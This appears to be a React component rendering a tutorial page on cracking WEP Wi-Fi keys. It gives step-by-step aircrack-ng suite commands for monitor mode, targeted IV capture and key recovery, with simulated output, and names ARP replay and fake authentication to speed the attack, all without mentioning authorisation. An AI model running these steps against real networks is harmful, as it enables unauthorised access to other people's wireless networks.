import Terminal from '../../components/Terminal';
import InfoBox from '../../components/InfoBox';
import { Troubleshooting, TroubleItem } from '../../components/Troubleshooting';

export default function WEPCrackingBasics() {
  return (
    <div className="content-area">
      <div className="topic-header">
        <div className="topic-breadcrumb">WEP Cracking <span>/</span> Cracking Basics</div>
        <h1>WEP Cracking Basics</h1>
        <p className="topic-desc">The basic WEP cracking method: capture enough IVs from the target network, then use aircrack-ng to statistically recover the key.</p>
      </div>

      <div className="topic-section">
        <h2>Full WEP Cracking Workflow</h2>

        <h3>Step 1: Enable Monitor Mode</h3>
        <Terminal title="Monitor Mode" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo airmon-ng check kill' }],
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo airmon-ng start ' }, { type: 'string', text: 'wlan0' }],
        ]} />

        <h3>Step 2: Discover Target Network</h3>
        <Terminal title="Find WEP Networks" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo airodump-ng ' }, { type: 'string', text: 'wlan0mon' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: ' BSSID              PWR  Beacons  #Data  CH  ENC   ESSID' }],
          [{ type: 'output', text: ' AA:BB:CC:DD:EE:FF  -42    150      50    6  ' }, { type: 'highlight', text: 'WEP' }, { type: 'output', text: '   TargetWEP' }],
          [{ type: 'comment', text: '# Look for networks with ENC = WEP' }],
        ]} />

        <h3>Step 3: Targeted Capture with Write</h3>
        <Terminal title="Capture IVs" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo airodump-ng ' }, { type: 'flag', text: '--bssid ' }, { type: 'highlight', text: 'AA:BB:CC:DD:EE:FF ' }, { type: 'flag', text: '--channel ' }, { type: 'number', text: '6 ' }, { type: 'flag', text: '--write ' }, { type: 'string', text: 'wep_capture ' }, { type: 'string', text: 'wlan0mon' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: ' CH  6 ][ Elapsed: 10 min' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: ' BSSID              PWR  Beacons  #Data  CH  ENC   ESSID' }],
          [{ type: 'output', text: ' AA:BB:CC:DD:EE:FF  -42   1200    ' }, { type: 'highlight', text: '15000' }, { type: 'output', text: '    6  WEP   TargetWEP' }],
          [{ type: 'comment', text: '# Watch the #Data column — you need it to reach 10,000+' }],
        ]} />

        <InfoBox type="note">
          <p>The <code className="inline-code">#Data</code> column shows the number of data packets (IVs) captured. You need at least <strong>10,000</strong> for a good chance of cracking. More is better — aim for 20,000+.</p>
        </InfoBox>

        <h3>Step 4: Crack the Key</h3>
        <p>While airodump-ng is still running, open a new terminal:</p>
        <Terminal title="Crack WEP Key" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo aircrack-ng ' }, { type: 'string', text: 'wep_capture-01.cap' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: '                              Aircrack-ng 1.7' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: '                [00:00:02] Tested 835 keys (got 15234 IVs)' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: '   KB    depth   byte(vote)' }],
          [{ type: 'output', text: '    0    0/ 1    AB(23040) 3D(21504) 09(20992)' }],
          [{ type: 'output', text: '    1    0/ 3    CD(22016) 1A(20480) 7B(19968)' }],
          [{ type: 'output', text: '    ...' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: '          ' }, { type: 'highlight', text: 'KEY FOUND! [ AB:CD:EF:12:34 ]' }],
          [{ type: 'output', text: '   Decrypted correctly: 100%' }],
        ]} />

        <InfoBox type="tip" title="Key Found!">
          <p>The key is displayed in hex format. To connect to the network, use the key without the colons: <code className="inline-code">ABCDEF1234</code></p>
        </InfoBox>
      </div>

      <div className="topic-section">
        <h2>Speeding Up the Attack</h2>
        <p>If the network has little traffic, IVs accumulate slowly. Solutions:</p>
        <ul>
          <li><strong>Fake Authentication Attack</strong> — Associate with the AP to inject packets</li>
          <li><strong>ARP Replay Attack</strong> — Re-inject captured ARP packets to generate new IVs</li>
          <li><strong>Wait for busy hours</strong> — More users = more traffic = more IVs</li>
        </ul>
      </div>

      <Troubleshooting>
        <TroubleItem issue="aircrack-ng says 'not enough IVs'">
          <div className="solution">Solution:</div>
          <p>Keep airodump-ng running to collect more packets. You need at least 10,000 data packets. Use ARP replay attack to speed this up.</p>
        </TroubleItem>
        <TroubleItem issue="aircrack-ng fails to find the key even with enough IVs">
          <div className="solution">Solution:</div>
          <p>Try with more IVs (50,000+). Also try specifying the key length:</p>
          <Terminal title="Specify Key Length" lines={[
            [{ type: 'comment', text: '# For 64-bit WEP' }],
            [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'aircrack-ng ' }, { type: 'flag', text: '-n 64 ' }, { type: 'string', text: 'wep_capture-01.cap' }],
            [{ type: 'comment', text: '# For 128-bit WEP' }],
            [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'aircrack-ng ' }, { type: 'flag', text: '-n 128 ' }, { type: 'string', text: 'wep_capture-01.cap' }],
          ]} />
        </TroubleItem>
        <TroubleItem issue="'No networks found in file'">
          <div className="solution">Solution:</div>
          <p>Make sure you're pointing to the correct <code className="inline-code">.cap</code> file. Check with <code className="inline-code">ls *.cap</code>. The file should have data in it — if it's 0 bytes, the capture failed.</p>
        </TroubleItem>
        <TroubleItem issue="#Data column stays at 0 or grows very slowly">
          <p>No active clients or traffic on the network. You need to either wait for activity or use packet injection techniques (fake auth + ARP replay) covered in the next topics.</p>
        </TroubleItem>
      </Troubleshooting>
    </div>
  );
}
